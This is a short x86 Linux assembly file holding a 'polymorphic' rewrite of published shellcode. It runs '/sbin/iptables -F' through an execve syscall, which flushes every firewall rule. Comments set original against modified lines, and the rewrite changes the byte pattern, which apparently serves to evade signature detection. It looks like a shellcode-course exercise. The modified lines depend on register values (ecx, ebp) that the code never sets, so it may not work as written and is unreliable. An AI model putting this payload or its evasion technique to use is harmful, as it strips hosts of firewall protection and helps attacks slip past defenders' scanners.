;Filename: iptables.nasm
;Nasm code obtained from: http://shell-storm.org/shellcode/files/shellcode-825.php
;Polymorphic version author: MrSquid

;Original Lenght: 43 bytes 

;Polymorphic version: 45 bytes

global _start 

section .text

_start:

	;xor eax,eax		;Original line
	;push eax		;Original line
	push ecx		;Modified line
	push word 0x462d
	;mov esi,esp		;Original line
	lea esi,[ebp-34] 	;Modified line
	;push eax		;Original line
	push ecx		;Modified line
	push dword 0x73656c62
	push dword 0x61747069
	push dword 0x2f6e6962
	push dword 0x732f2f2f
	;mov ebx,esp		;Original line
	lea ebx, [esi-20] 	;Modified line
	;push eax		;Original line
	push ecx		;Modified line
	push esi
	push ebx
	;mov ecx,esp		;Original line
	lea ecx,[ebx-12]	;Modified line
	;mov edx,eax		;Original line
	xor edx,edx 		;Modified line
	;mov al,0xb		;Original line
	push 0xb		;Modified line
	pop eax			;Modified line
	int 0x80


